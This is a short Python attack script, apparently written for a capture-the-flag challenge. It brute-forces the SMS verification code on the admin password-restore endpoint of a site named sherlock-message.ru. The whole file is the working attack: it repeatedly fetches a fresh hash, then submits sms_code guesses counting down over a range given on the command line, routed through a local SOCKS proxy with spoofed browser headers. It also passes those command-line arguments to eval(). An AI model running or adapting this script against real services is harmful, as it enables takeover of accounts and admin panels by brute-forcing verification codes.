#!/usr/bin/python3
#__author__:TaQini
import requests
import json
from sys import argv

# header
s=requests.session()                                     
s.headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
s.headers['Accept-Encoding']='gzip, deflate, br'
s.headers['Host']='sherlock-message.ru'  
s.headers['Accept-Language']='zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,ko;q=0.6'
s.headers['User-Agent']='zilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'
s.headers['Referer']='http://sherlock-message.ru/admin'

url = "http://sherlock-message.ru/api/admin.restore"
newHash = ''
proxies = {'socks5':'127.0.0.1:7981'}
# post
def get_hash():
    global newHash
    while True:
        try:
            r = requests.get(url,proxies=proxies)
            if r.status_code == 200:
                if 'new_hash' in r.text:
                    newHash = json.loads(r.text)['response']['new_hash']
                    break
                else:
                    exit()
        except Exception:
            pass

    return newHash

def p(n):                          
    num = n                
    res = s.post(url=url,data={'hash':newHash,'sms_code':num},proxies=proxies)
    res.encoding = res.apparent_encoding
    return res.text 

for i in range(eval(argv[1]),eval(argv[1])-eval(argv[2]),-1):
    get_hash()
    print("num is %d now"%i)
    print(p(i))
